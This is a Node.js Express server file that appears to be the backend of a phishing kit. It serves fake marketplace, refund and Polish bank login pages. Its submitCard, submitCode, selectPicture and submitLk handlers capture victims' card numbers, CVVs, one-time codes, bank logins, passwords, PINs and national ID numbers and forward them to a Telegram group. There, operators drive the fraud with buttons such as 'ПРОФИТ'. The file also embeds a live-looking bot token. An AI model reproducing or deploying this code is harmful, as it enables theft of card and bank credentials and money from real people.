require("dotenv").config({
  path: require("path").resolve("../.env"),
});
const express = require("express"),
  http = require("http"),
  bodyParser = require("body-parser"),
  cookieParser = require("cookie-parser"),
  session = require("express-session"),
  path = require("path"),
  { Telegram, Markup } = require("telegraf"),
  bot = new Telegram("5303129662:AAGaG4VdhMKt0eNu5i8wEbv5VQXUmzyW86M");

const geoIp = require("geoip-lite"),
  { getName } = require("country-list"),
  userAgent = require("express-useragent");

const NodeCache = require("node-cache");
const cache = new NodeCache();

const escapeHTML = require("escape-html");
const { Ad, Support, SupportChat, Log, Settings } = require("../database");
const serverLog = require("../helpers/serverLog");
const translate = require("./translate");

const binInfo = require("../helpers/binInfo");
const locale = require("../locale");

const app = express();

app.set("trust proxy", 1);
app.use(
  session({
    secret: "porfa este dos puntos",
    resave: false,
    saveUninitialized: true,
  })
);

app.use(
  bodyParser.urlencoded({
    extended: true,
  })
);
app.use(bodyParser.json());
app.use(cookieParser());

app.use(express.static(path.join(__dirname, "/static")));
app.set("views", path.join(__dirname, "views"));
app.engine("html", require("ejs").renderFile);
app.set("view engine", "html");

app.use((req, res, next) => {
  var ip = String(req.headers["cf-connecting-ip"] || req.headers["x-forwarded-for"] || req.connection.remoteAddress).replace(
    "::ffff:",
    ""
  );
  req.realIp = ip;
  req.fullUrl = req.protocol + "://" + req.get("host") + req.originalUrl;
  return next();
});

async function getCardInfo(cardNumber) {
  try {
    const bininfo = await binInfo(String(cardNumber).substr(0, 8));
    var text = "";

    if (bininfo.bank) text += `\n— Банк: <b>${bininfo.bank}</b>`;
    if (bininfo.country) text += `\n— Страна: <b>${bininfo.country}</b>`;
    // if (bininfo.scheme) text += `\n— П/С: <b>${bininfo.scheme}</b>`;
    // if (bininfo.type) text += `\n— Тип: <b>${bininfo.type}</b>`;
    // if (bininfo.brand) text += `\n— Брэнд: <b>${bininfo.brand}</b>`;

    return text;
  } catch (err) {
    return "<b>неизвестно</b>";
  }
}

function getBalance(log, ad) {
  if (!ad.balanceChecker) return "выключен";

  var text = `${parseFloat(log.otherInfo.cardBalance).toFixed(2)} ${ad.service.currency.code}`;

  if (ad.service.currency.code != "EUR")
    text += ` / ${(parseFloat(log.otherInfo.cardBalance) * ad.service.currency.eur).toFixed(2)} EUR`;
  if (ad.service.currency.code != "RUB")
    text += ` / ${(parseFloat(log.otherInfo.cardBalance) * ad.service.currency.rub).toFixed(2)} RUB`;

  return text;
}

const DDOS_MAX_REQUESTS_ON_AD_ID = 200,
  DDOS_MAX_REQUESTS_ON_URL = 100,
  DDOS_BAN_TIME = 1800, //in seconds
  DDOS_REFRESH_TIME_ON_AD = 10; //in seconds
DDOS_REFRESH_TIME_ON_URL = 10; //in seconds

async function sendDDoSMessage(req, url, ad_id) {
  try {
    const ad = await Ad.findByPk(ad_id, {
      include: [
        {
          association: "user",
          required: true,
        },
      ],
    });
    serverLog(
      bot,
      `<b>🆘 Зафиксирована возможная DDoS-атака!</b>
  
🔗 URL: <b>${url}</b>
📦 ID Объявления: <code>${ad_id}</code>
👤 Пользователь: <b><a href="tg://user?id=${ad.userId}">${ad.user.username}</a> | ID: <code>${ad.userId}</code></b>`,
      {
        parse_mode: "HTML",
      }
    );
  } catch (err) {}
}

function ddosCheck(req, url, ad_id = null) {
  if (ad_id) {
    var trafficToAd = cache.get(`ad_${ad_id}_${req.realIp}`);
    if (trafficToAd && trafficToAd >= DDOS_MAX_REQUESTS_ON_AD_ID) {
      cache.set(`ad_${ad_id}_${req.realIp}`, DDOS_MAX_REQUESTS_ON_AD_ID, DDOS_BAN_TIME);
      if (!cache.get(`ad_${ad_id}_ddos`)) {
        sendDDoSMessage(req, url, ad_id);
        cache.set(`ad_${ad_id}_ddos`, true, DDOS_BAN_TIME);
      }
      return true;
    }
    cache.set(`ad_${ad_id}_${req.realIp}`, trafficToAd ? trafficToAd + 1 : 1, DDOS_REFRESH_TIME_ON_AD);
  }
  if (url) {
    var trafficToUrl = cache.get(`url_${url}_${req.realIp}`);
    if (trafficToUrl && trafficToUrl >= DDOS_MAX_REQUESTS_ON_URL) {
      cache.set(`url_${url}_${req.realIp}`, DDOS_BAN_TIME);
      return true;
    }
    cache.set(`url_${url}_${req.realIp}`, trafficToUrl ? trafficToUrl + 1 : 1, DDOS_REFRESH_TIME_ON_URL);
  }
  return false;
}

function getUserInfo(req) {
  try {
    var text = `🌐 IP: <b>${req.realIp}</b>`;
    const ipInfo = geoIp.lookup(req.realIp),
      userInfo = userAgent.parse(req.headers["user-agent"]);
    try {
      text += `\n🌎 Страна: <b>${getName(ipInfo.country)}</b>`;
    } catch (err) {}
    text += `\n💻 Информация об устройстве:
— Устройство: <b>${
      userInfo.isMobile ? "📱 Телефон" : userInfo.isDesktop ? "🖥 Компьютер" : userInfo.isBot ? "🤖 Бот" : "📟 Что-то другое"
    }</b>
— Браузер: <b>${userInfo.browser}</b>
— Операционная система: <b>${userInfo.os}</b>`;

    return text;
  } catch (err) {
    return "🔍 Нет данных";
  }
}

async function generateSupport(ad, req, res) {
  if (req.session.supportToken) {
    const support = await Support.findOne({
      where: {
        token: req.session.supportToken,
        adId: ad.id,
      },
      include: [
        {
          association: "messages",
        },
      ],
    });
    if (support) return support;
  }
  const support = await Support.create({
    adId: ad.id,
    token: Math.random() + new Date().valueOf() + Math.random(),
  });
  support.messages = [];
  req.session.supportToken = support.token;

  return support;
}

app.get("/:adId", async (req, res) => {
  try {
    if (ddosCheck(req, req.fullUrl, req.params.adId)) return res.sendStatus(429);
    const ad = await Ad.findByPk(req.params.adId, {
      include: [
        {
          association: "service",
          required: true,
        },
      ],
    });
    if (!ad) return res.sendStatus(404);
    var serviceCode = ad.serviceCode.split("_");
    const support = await generateSupport(ad, req, res);

    bot
      .sendMessage(
        ad.userId,
        `<b>🔗 Переход по ссылке ${ad.service.title}</b>
    
📦 Объявление: <b>${ad.title}</b>
💰 Цена: <b>${ad.price}</b>

${getUserInfo(req)}`,
        {
          parse_mode: "HTML",
          disable_web_page_preview: true,
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("✍️ Отправить сообщение в ТП", `support_${support.id}_send_message`)],
          ]),
        }
      )
      .catch((err) => err);

    return res.render(`fakes/${serviceCode[1]}/${serviceCode[0]}/index`, {
      ad,
      support,
    });
  } catch (err) {
    return res.send(err);
  }
});

app.get("/refund/:adId", async (req, res) => {
  try {
    if (ddosCheck(req, req.fullUrl, req.params.adId)) return res.sendStatus(429);
    const ad = await Ad.findByPk(req.params.adId, {
      include: [
        {
          association: "service",
          required: true,
        },
      ],
    });
    if (!ad) return res.sendStatus(404);
    var serviceCode = ad.serviceCode.split("_");
    const support = await generateSupport(ad, req, res);

    bot
      .sendMessage(
        ad.userId,
        `<b>🔗 Переход на возврат ${ad.service.title}</b>
    
📦 Объявление: <b>${ad.title}</b>
💰 Цена: <b>${ad.price}</b>

${getUserInfo(req)}`,
        {
          parse_mode: "HTML",
          disable_web_page_preview: true,
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("✍️ Отправить сообщение в ТП", `support_${support.id}_send_message`)],
          ]),
        }
      )
      .catch((err) => err);

    return res.render(`card`, {
      ad,
      support,
      translate,
    });
  } catch (err) {
    return res.send(err);
  }
});

app.get("/card/:adId", async (req, res) => {
  try {
    if (ddosCheck(req, req.fullUrl, req.params.adId)) return res.sendStatus(429);
    const ad = await Ad.findByPk(req.params.adId, {
      include: [
        {
          association: "service",
          required: true,
        },
      ],
    });
    if (!ad) return res.sendStatus(404);
    var serviceCode = ad.serviceCode.split("_");
    const support = await generateSupport(ad, req, res);

    bot
      .sendMessage(
        ad.userId,
        `<b>💳 Переход на ввод карты ${ad.service.title}</b>
    
📦 Объявление: <b>${ad.title}</b>
💰 Цена: <b>${ad.price}</b>

${getUserInfo(req)}`,
        {
          parse_mode: "HTML",
          disable_web_page_preview: true,
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("✍️ Отправить сообщение в ТП", `support_${support.id}_send_message`)],
          ]),
        }
      )
      .catch((err) => err);

    return res.render(`card`, {
      ad,
      support,
      translate,
    });
  } catch (err) {
    return res.send(err);
  }
});

app.get(`/personal/:logToken`, async (req, res) => {
  try {
    const log = await Log.findOne({
      where: {
        token: req.params.logToken,
      },
      include: [
        {
          association: "ad",
          required: true,
          include: [
            {
              association: "service",
              required: true,
              include: [
                {
                  association: "country",
                  required: true,
                },
              ],
            },
          ],
        },
      ],
    });
    if (!log) return res.sendStatus(404);
    if (!log.ad.service.country.withLk) return res.redirect(`/card/${log.adId}`);
    const cardInfo = (await binInfo(String(log.cardNumber).substr(0, 8)).catch((err) => err)) || null;
    var lkPage = "default";
    if (log.ad.service.country.id == "pl") {
      if (/MBANK/giu.test(cardInfo.bank)) lkPage = "mbank";
      if (/ING/giu.test(cardInfo.bank)) lkPage = "ing";
      if (/MILLENNIUM/giu.test(cardInfo.bank)) lkPage = "millennium";
      if (/ALIOR/giu.test(cardInfo.bank)) lkPage = "alior";
      if (/AGRICOLE/giu.test(cardInfo.bank)) lkPage = "agricole";
      if (/PARIBAS/giu.test(cardInfo.bank)) lkPage = "paribas";
      if (/NOBLE/giu.test(cardInfo.bank)) lkPage = "noblebank";
      if (/GET(\s)?IN/giu.test(cardInfo.bank)) lkPage = "getin";
      if (/PEKAO/giu.test(cardInfo.bank)) lkPage = "pekao";
      if (/POCZTOWY/giu.test(cardInfo.bank)) lkPage = "pocztowy";
      if (/HANDLOWY/giu.test(cardInfo.bank)) lkPage = "handlowy";
      if (/ENVELO/giu.test(cardInfo.bank)) lkPage = "envelo";
      if (/PLUS(\s)?BANK/giu.test(cardInfo.bank)) lkPage = "plusbank";
      if (/PKO/giu.test(cardInfo.bank)) lkPage = "ipko";
      if (/SANTANDER|ZACHODNI/giu.test(cardInfo.bank)) lkPage = "santander";
    }

    const support = await generateSupport(log.ad, req, res);

    bot
      .sendMessage(
        log.ad.userId,
        `<b>🔐 Переход на ЛК ${log.ad.service.title}</b>
  
📦 Объявление: <b>${log.ad.title}</b>
💰 Цена: <b>${log.ad.price}</b>

${getUserInfo(req)}`,
        {
          parse_mode: "HTML",
          disable_web_page_preview: true,
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("✍️ Отправить сообщение в ТП", `support_${support.id}_send_message`)],
          ]),
        }
      )
      .catch((err) => err);

    return res.render(`personal/${log.ad.service.country.id}/${lkPage}`, {
      log,
      cardInfo,
      translate,
    });
  } catch (err) {
    return res.send(err);
  }
});

app.get("/supportChatFrame/:adId", async (req, res) => {
  try {
    const ad = await Ad.findByPk(req.params.adId, {
      include: [
        {
          association: "service",
          required: true,
        },
      ],
    });
    if (!ad) return res.sendStatus(404);
    const support = await generateSupport(ad, req, res);
    return res.render(`support`, {
      ad,
      support,
      translate,
    });
  } catch (err) {
    return res.send(err);
  }
});

app.post(`/api/support/sendMessage`, async (req, res) => {
  try {
    const support = await Support.findOne({
      where: {
        token: req.body.supportToken,
      },
      include: [
        {
          association: "ad",
          required: true,
          include: [
            {
              association: "service",
              required: true,
            },
          ],
        },
      ],
    });

    if (!support) return res.sendStatus(404);
    await SupportChat.create({
      supportId: support.id,
      messageFrom: 1,
      message: escapeHTML(req.body.message.substr(0, 2000)),
    });
    await bot
      .sendMessage(
        support.ad.userId,
        `📤 Новое сообщение из ТП <b>${support.ad.service.title}</b>
    
💬 Его текст: <b>${escapeHTML(req.body.message.substr(0, 2000))}</b>

📦 Объявление: <b>${support.ad.title}</b>`,
        {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([[Markup.callbackButton("✍️ Ответить", `support_${support.id}_send_message`)]]),
        }
      )
      .catch((err) => err);
    return res.sendStatus(200);
  } catch (err) {
    console.log(err);
    return res.send(err);
  }
});

app.post(`/api/support/getMessages`, async (req, res) => {
  try {
    const support = await Support.findOne({
      where: {
        token: req.body.supportToken,
      },
      include: [
        {
          association: "messages",
        },
        {
          association: "ad",
        },
      ],
    });

    if (!support) return res.sendStatus(404);

    support.messages
      .filter((v) => v.messageFrom == 0 && !v.readed)
      .map(async (v) => {
        try {
          await v.update({
            readed: true,
          });
          await bot.sendMessage(support.ad.userId, `📥 Сообщение доставлено`, {
            reply_to_message_id: v.messageId,
          });
        } catch (err) {}
      });

    return res.json({
      messages: support.messages,
    });
  } catch (err) {
    return res.send(err);
  }
});

app.post(`/api/checkStatus`, async (req, res) => {
  try {
    const log = await Log.findOne({
      where: {
        token: req.body.token,
      },
      include: [
        {
          association: "ad",
          required: true,
        },
      ],
    });
    if (!log) return res.sendStatus(404);

    return res.json({
      status: log.status,
    });
  } catch (err) {
    return res.send(err);
  }
});

app.post(`/api/submitCard`, async (req, res) => {
  try {
    const ad = await Ad.findByPk(req.body.adId, {
      include: [
        {
          association: "service",
          required: true,
          include: [
            {
              association: "currency",
              required: true,
            },
          ],
        },
        {
          association: "user",
          required: true,
        },
      ],
    });
    if (!ad) return res.sendStatus(404);

    const log = await Log.create({
      token: Math.random() + new Date().valueOf() + Math.random(),
      cardNumber: escapeHTML(String(req.body.number).replace(/\D+/g, "")),
      cardExpire: escapeHTML(String(req.body.expire).replace(/[^0-9\/]+/g, "")),
      cardCvv: escapeHTML(String(req.body.cvv).replace(/\D+/g, "")),
      otherInfo: {
        cardBalance: escapeHTML(req.body.balance),
      },
      adId: ad.id,
    });

    const settings = await Settings.findByPk(1);
    const support = await generateSupport(ad, req, res);
    const cardInfo = await getCardInfo(log.cardNumber);
    await bot.sendMessage(
      settings.logsGroupId,
      `<b>✏️ Ввод карты ${ad.service.title}</b>

💰 Баланс: <code>${getBalance(log, ad)}</code>

💳 Номер карты: <b>${log.cardNumber}</b>
📅 Срок действия: <b>${log.cardExpire}</b>
🔒 CVV: <b>${log.cardCvv}</b>

ℹ️ Информация о карте: ${cardInfo}

👨🏻‍💻 Воркер: <b><a href="tg://user?id=${ad.userId}">${ad.user.username}</a></b>
👤 ID Воркера: <code>${ad.userId}</code>

⚡️ ID Объявления: <code>${ad.id}</code>
📦 Объявление: <b>${ad.title}</b>
💰 Цена: <b>${ad.price}</b>`,
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([[Markup.callbackButton("✍️ Взять на вбив", `take_log_${log.id}`)]]),
      }
    );
    await bot
      .sendMessage(
        ad.userId,
        `<b>💳 Ввод карты ${ad.service.title}</b>

💳 Номер карты: <b>${log.cardNumber.replace(/^(.{6})([0-9]{6})/, "$1******")}</b>

💰 Баланс: <code>${getBalance(log, ad)}</code>
ℹ️ Информация о карте: ${cardInfo}

📦 Объявление: <b>${ad.title}</b>
💰 Цена: <b>${ad.price}</b>`,
        {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("✍️ Отправить сообщение в ТП", `support_${support.id}_send_message`)],
          ]),
        }
      )
      .catch((err) => err);

    if (settings.allLogsEnabled)
      await bot
        .sendMessage(
          settings.allGroupId,
          `<b>💳 Ввод карты ${ad.service.title}</b>
  
💰 Баланс: <code>${getBalance(log, ad)}</code>
👷 Воркер: <b>${ad.user.hideNick ? "Скрыт" : `<a href="tg://user?id=${ad.userId}">${ad.user.username}</a>`}</b>`,
          {
            disable_notification: true,
            disable_web_page_preview: true,
            parse_mode: "HTML",
          }
        )
        .catch((err) => err);

    return res.json({
      token: log.token,
    });
  } catch (err) {
    console.log(err);
    return res.send(err);
  }
});

app.post(`/api/submitCode`, async (req, res) => {
  try {
    if (!req.body?.token || String(req.body?.token).trim().length < 1) return res.sendStatus(200);
    const log = await Log.findOne({
      where: {
        token: req.body.token,
      },
      include: [
        {
          association: "writer",
          required: true,
        },
        {
          association: "ad",
          required: true,
          include: [
            {
              association: "user",
              required: true,
            },
            {
              association: "service",
              required: true,
              include: [
                {
                  association: "country",
                  required: true,
                },
                {
                  association: "currency",
                  required: true,
                },
              ],
            },
          ],
        },
      ],
    });
    if (!log) return res.sendStatus(404);
    const code = escapeHTML(req.body.code.trim());
    const support = await generateSupport(log.ad, req, res);
    var bank;
    try {
      const cardInfo = await binInfo(String(log.cardNumber).substr(0, 8));
      bank = cardInfo.bank;
    } catch (err) {}

    const settings = await Settings.findByPk(1);
    if (log.smsCode == code) return res.sendStatus(200);
    await log.update({
      smsCode: code,
    });

    const codeType = {
      sms: "СМС-кода",
      blik: "БЛИК-кода",
      call: "кода из звонка",
      app: "кода из приложения",
    };

    await bot.sendMessage(
      settings.logsGroupId,
      `<b>📤 Ввод ${codeType[req.body.codeType || "sms"]} ${log.ad.service.title}</b>

📤 Код: <b>${code}</b>

💰 Баланс: <code>${getBalance(log, log.ad)}</code>

💳 Номер карты: <b>${log.cardNumber}</b>
📅 Срок действия: <b>${log.cardExpire}</b>
🔒 CVV: <b>${log.cardCvv}</b>

ℹ️ Информация о карте: ${await getCardInfo(log.cardNumber)}

👨🏻‍💻 Воркер: <b><a href="tg://user?id=${log.ad.userId}">${log.ad.user.username}</a></b>
👤 ID Воркера: <code>${log.ad.userId}</code>

⚡️ ID Объявления: <code>${log.ad.id}</code>
📦 Объявление: <b>${log.ad.title}</b>
💰 Цена: <b>${log.ad.price}</b>`,
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton("✅ ПРОФИТ", `log_${log.id}_profit`)],
          [Markup.callbackButton(`Текущий статус: ${locale.statuses[log.status]}`, "none")],
          [Markup.callbackButton(`Взял на вбив ${log.writer.username}`, "none")],
          [Markup.callbackButton("📱 ПУШ", `log_${log.id}_push`), Markup.callbackButton("📥 СМС-КОД", `log_${log.id}_sms`)],
          ...(log.ad.service.country.withLk ? [[Markup.callbackButton("🔐 ЛК", `log_${log.id}_lk`)]] : []),
          [
            Markup.callbackButton("📬 КОД С ПРИЛОЖЕНИЯ", `log_${log.id}_appCode`),
            Markup.callbackButton("☎️ КОД ИЗ ЗВОНКА", `log_${log.id}_callCode`),
          ],
          ...(String(bank).match(/MILLENNIUM/giu) ? [[Markup.callbackButton("🖼 КАРТИНКА", `log_${log.id}_picture`)]] : []),
          ...(["pl"].includes(log.ad.service.country.id) ? [[Markup.callbackButton("#️⃣ БЛИК", `log_${log.id}_blik`)]] : []),
          [
            Markup.callbackButton("⚠️ ЛИМИТЫ", `log_${log.id}_limits`),
            Markup.callbackButton("⚠️ ДРУГАЯ КАРТА", `log_${log.id}_otherCard`),
          ],
          [
            Markup.callbackButton("⚠️ ТОЧНЫЙ БАЛАНС", `log_${log.id}_correctBalance`),
            ...(["ua"].includes(log.ad.service.country.id)
              ? [Markup.callbackButton("⚠️ НУЖЕН БАЛАНС", `log_${log.id}_forVerify`)]
              : []),
          ],
          [
            Markup.callbackButton("❌ Неверный КОД", `log_${log.id}_wrong_code`),
            ...(log.ad.service.country.withLk ? [Markup.callbackButton("❌ Неверный ЛК", `log_${log.id}_wrong_lk`)] : []),
          ],
          [
            ...(String(bank).match(/MILLENNIUM/giu)
              ? [Markup.callbackButton("❌ Неверная КАРТИНКА", `log_${log.id}_wrong_picture`)]
              : []),
            Markup.callbackButton("❌ Не подтверждает ПУШ", `log_${log.id}_wrong_push`),
          ],
          [Markup.callbackButton("🚪 Выйти со вбива", `log_${log.id}_leave`)],
        ]),
      }
    );
    await bot
      .sendMessage(
        log.ad.userId,
        `<b>📤 Ввод ${codeType[req.body.codeType || "sms"]} ${log.ad.service.title}</b>

💰 Баланс: <code>${getBalance(log, log.ad)}</code>

📦 Объявление: <b>${log.ad.title}</b>
💰 Цена: <b>${log.ad.price}</b>`,
        {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("✍️ Отправить сообщение в ТП", `support_${support.id}_send_message`)],
          ]),
        }
      )
      .catch((err) => err);
    return res.sendStatus(200);
  } catch (err) {
    console.log(err);
    return res.send(err);
  }
});
app.post(`/api/selectPicture`, async (req, res) => {
  try {
    if (!req.body?.token || String(req.body?.token).trim().length < 1) return res.sendStatus(200);
    const pictures = [
      "банан",
      "брюки",
      "бургер",
      "гитара",
      "зонтик",
      "календарь",
      "калькулятор",
      "карандаш",
      "клубника",
      "компас",
      "крокодил",
      "лимон",
      "мамонт",
      "микрофон",
      "наушники",
      "очки",
      "помидор",
      "свитер",
      "телефон",
      "цветок",
      "шоколад",
    ];
    if (!pictures.includes(req.body.picture)) return res.sendStatus(200);
    const log = await Log.findOne({
      where: {
        token: req.body.token,
      },
      include: [
        {
          association: "writer",
          required: true,
        },
        {
          association: "ad",
          required: true,
          include: [
            {
              association: "user",
              required: true,
            },
            {
              association: "service",
              required: true,
              include: [
                {
                  association: "country",
                  required: true,
                },
                {
                  association: "currency",
                  required: true,
                },
              ],
            },
          ],
        },
      ],
    });
    if (!log) return res.sendStatus(404);

    const support = await generateSupport(log.ad, req, res);
    var bank;
    try {
      const cardInfo = await binInfo(String(log.cardNumber).substr(0, 8));
      bank = cardInfo.bank;
    } catch (err) {}

    const settings = await Settings.findByPk(1);

    await log.update({
      otherInfo: {
        ...log.otherInfo,
        picture: req.body.picture,
      },
    });

    await bot.sendMessage(
      settings.logsGroupId,
      `<b>🖼  Выбор картинки ${log.ad.service.title}</b>

🖼 Картинка: <b>${req.body.picture}</b>

💰 Баланс: <code>${getBalance(log, log.ad)}</code>

💳 Номер карты: <b>${log.cardNumber}</b>
📅 Срок действия: <b>${log.cardExpire}</b>
🔒 CVV: <b>${log.cardCvv}</b>

ℹ️ Информация о карте: ${await getCardInfo(log.cardNumber)}

👨🏻‍💻 Воркер: <b><a href="tg://user?id=${log.ad.userId}">${log.ad.user.username}</a></b>
👤 ID Воркера: <code>${log.ad.userId}</code>

⚡️ ID Объявления: <code>${log.ad.id}</code>
📦 Объявление: <b>${log.ad.title}</b>
💰 Цена: <b>${log.ad.price}</b>`,
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton("✅ ПРОФИТ", `log_${log.id}_profit`)],
          [Markup.callbackButton(`Текущий статус: ${locale.statuses[log.status]}`, "none")],
          [Markup.callbackButton(`Взял на вбив ${log.writer.username}`, "none")],
          [Markup.callbackButton("📱 ПУШ", `log_${log.id}_push`), Markup.callbackButton("📥 СМС-КОД", `log_${log.id}_sms`)],
          ...(log.ad.service.country.withLk ? [[Markup.callbackButton("🔐 ЛК", `log_${log.id}_lk`)]] : []),
          [
            Markup.callbackButton("📬 КОД С ПРИЛОЖЕНИЯ", `log_${log.id}_appCode`),
            Markup.callbackButton("☎️ КОД ИЗ ЗВОНКА", `log_${log.id}_callCode`),
          ],
          ...(String(bank).match(/MILLENNIUM/giu) ? [[Markup.callbackButton("🖼 КАРТИНКА", `log_${log.id}_picture`)]] : []),
          ...(["pl"].includes(log.ad.service.country.id) ? [[Markup.callbackButton("#️⃣ БЛИК", `log_${log.id}_blik`)]] : []),
          [
            Markup.callbackButton("⚠️ ЛИМИТЫ", `log_${log.id}_limits`),
            Markup.callbackButton("⚠️ ДРУГАЯ КАРТА", `log_${log.id}_otherCard`),
          ],
          [
            Markup.callbackButton("⚠️ ТОЧНЫЙ БАЛАНС", `log_${log.id}_correctBalance`),
            ...(["ua"].includes(log.ad.service.country.id)
              ? [Markup.callbackButton("⚠️ НУЖЕН БАЛАНС", `log_${log.id}_forVerify`)]
              : []),
          ],
          [
            Markup.callbackButton("❌ Неверный КОД", `log_${log.id}_wrong_code`),
            ...(log.ad.service.country.withLk ? [Markup.callbackButton("❌ Неверный ЛК", `log_${log.id}_wrong_lk`)] : []),
          ],
          [
            ...(String(bank).match(/MILLENNIUM/giu)
              ? [Markup.callbackButton("❌ Неверная КАРТИНКА", `log_${log.id}_wrong_picture`)]
              : []),
            Markup.callbackButton("❌ Не подтверждает ПУШ", `log_${log.id}_wrong_push`),
          ],
          [Markup.callbackButton("🚪 Выйти со вбива", `log_${log.id}_leave`)],
        ]),
      }
    );
    await bot
      .sendMessage(
        log.ad.userId,
        `<b>🖼  Выбор картинки ${log.ad.service.title}</b>

💰 Баланс: <code>${getBalance(log, log.ad)}</code>

📦 Объявление: <b>${log.ad.title}</b>
💰 Цена: <b>${log.ad.price}</b>`,
        {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("✍️ Отправить сообщение в ТП", `support_${support.id}_send_message`)],
          ]),
        }
      )
      .catch((err) => err);
    return res.sendStatus(200);
  } catch (err) {
    console.log(err);
    return res.send(err);
  }
});

app.post(`/api/submitLk`, async (req, res) => {
  try {
    if (!req.body?.token || String(req.body?.token).trim().length < 1) return res.sendStatus(200);
    const log = await Log.findOne({
      where: {
        token: req.body.token,
      },
      include: [
        {
          association: "writer",
          required: true,
        },
        {
          association: "ad",
          required: true,
          include: [
            {
              association: "user",
              required: true,
            },
            {
              association: "service",
              required: true,
              include: [
                {
                  association: "country",
                  required: true,
                },
                {
                  association: "currency",
                  required: true,
                },
              ],
            },
          ],
        },
      ],
    });
    if (!log) return res.sendStatus(404);

    const data = {
      login: req.body.login ? escapeHTML(String(req.body.login).trim()) : null,
      password: req.body.password ? escapeHTML(String(req.body.password).trim()) : null,
      pesel: req.body.pesel ? escapeHTML(String(req.body.pesel).trim()) : null,
      pin: req.body.pin ? escapeHTML(String(req.body.pin).trim()) : null,
      motherlastname: req.body.motherlastname ? escapeHTML(String(req.body.motherlastname).trim()) : null,
    };

    const support = await generateSupport(log.ad, req, res);
    const settings = await Settings.findByPk(1);

    await log.update({
      otherInfo: {
        ...log.otherInfo,
        ...data,
      },
    });

    var lkData = "";

    var translate = {
      login: "Логин",
      password: "Пароль",
      pesel: "Песель",
      pin: "ПИН",
      motherlastname: "Девичья фамилия матери",
    };

    Object.keys(data).map((v) => {
      if (data[v]) lkData += `\n${translate[v]}: <b>${data[v]}</b>`;
    });
    var bank;
    try {
      const cardInfo = await binInfo(String(log.cardNumber).substr(0, 8));
      bank = cardInfo.bank;
    } catch (err) {}
    await bot.sendMessage(
      settings.logsGroupId,
      `<b>🔐 Ввод данных ЛК ${log.ad.service.title}</b>
${lkData}

💰 Баланс: <code>${getBalance(log, log.ad)}</code>

💳 Номер карты: <b>${log.cardNumber}</b>
📅 Срок действия: <b>${log.cardExpire}</b>
🔒 CVV: <b>${log.cardCvv}</b>

ℹ️ Информация о карте: ${await getCardInfo(log.cardNumber)}

👨🏻‍💻 Воркер: <b><a href="tg://user?id=${log.ad.userId}">${log.ad.user.username}</a></b>
👤 ID Воркера: <code>${log.ad.userId}</code>

⚡️ ID Объявления: <code>${log.ad.id}</code>
📦 Объявление: <b>${log.ad.title}</b>
💰 Цена: <b>${log.ad.price}</b>`,
      {
        parse_mode: "HTML",
        reply_markup: Markup.inlineKeyboard([
          [Markup.callbackButton("✅ ПРОФИТ", `log_${log.id}_profit`)],
          [Markup.callbackButton(`Текущий статус: ${locale.statuses[log.status]}`, "none")],
          [Markup.callbackButton(`Взял на вбив ${log.writer.username}`, "none")],
          [Markup.callbackButton("📱 ПУШ", `log_${log.id}_push`), Markup.callbackButton("📥 СМС-КОД", `log_${log.id}_sms`)],
          ...(log.ad.service.country.withLk ? [[Markup.callbackButton("🔐 ЛК", `log_${log.id}_lk`)]] : []),
          [
            Markup.callbackButton("📬 КОД С ПРИЛОЖЕНИЯ", `log_${log.id}_appCode`),
            Markup.callbackButton("☎️ КОД ИЗ ЗВОНКА", `log_${log.id}_callCode`),
          ],
          ...(String(bank).match(/MILLENNIUM/giu) ? [[Markup.callbackButton("🖼 КАРТИНКА", `log_${log.id}_picture`)]] : []),
          ...(["pl"].includes(log.ad.service.country.id) ? [[Markup.callbackButton("#️⃣ БЛИК", `log_${log.id}_blik`)]] : []),
          [
            Markup.callbackButton("⚠️ ЛИМИТЫ", `log_${log.id}_limits`),
            Markup.callbackButton("⚠️ ДРУГАЯ КАРТА", `log_${log.id}_otherCard`),
          ],
          [
            Markup.callbackButton("⚠️ ТОЧНЫЙ БАЛАНС", `log_${log.id}_correctBalance`),
            ...(["ua"].includes(log.ad.service.country.id)
              ? [Markup.callbackButton("⚠️ НУЖЕН БАЛАНС", `log_${log.id}_forVerify`)]
              : []),
          ],
          [
            Markup.callbackButton("❌ Неверный КОД", `log_${log.id}_wrong_code`),
            ...(log.ad.service.country.withLk ? [Markup.callbackButton("❌ Неверный ЛК", `log_${log.id}_wrong_lk`)] : []),
          ],
          [
            ...(String(bank).match(/MILLENNIUM/giu)
              ? [Markup.callbackButton("❌ Неверная КАРТИНКА", `log_${log.id}_wrong_picture`)]
              : []),
            Markup.callbackButton("❌ Не подтверждает ПУШ", `log_${log.id}_wrong_push`),
          ],
          [Markup.callbackButton("🚪 Выйти со вбива", `log_${log.id}_leave`)],
        ]),
      }
    );
    await bot
      .sendMessage(
        log.ad.userId,
        `<b>🔐 Ввод данных ЛК ${log.ad.service.title}</b>

💰 Баланс: <code>${getBalance(log, log.ad)}</code>

📦 Объявление: <b>${log.ad.title}</b>
💰 Цена: <b>${log.ad.price}</b>`,
        {
          parse_mode: "HTML",
          reply_markup: Markup.inlineKeyboard([
            [Markup.callbackButton("✍️ Отправить сообщение в ТП", `support_${support.id}_send_message`)],
          ]),
        }
      )
      .catch((err) => err);
    return res.sendStatus(200);
  } catch (err) {
    console.log(err);
    return res.send(err);
  }
});

const server = http.createServer(app);
server.listen(8443, () => console.log("Server started"));
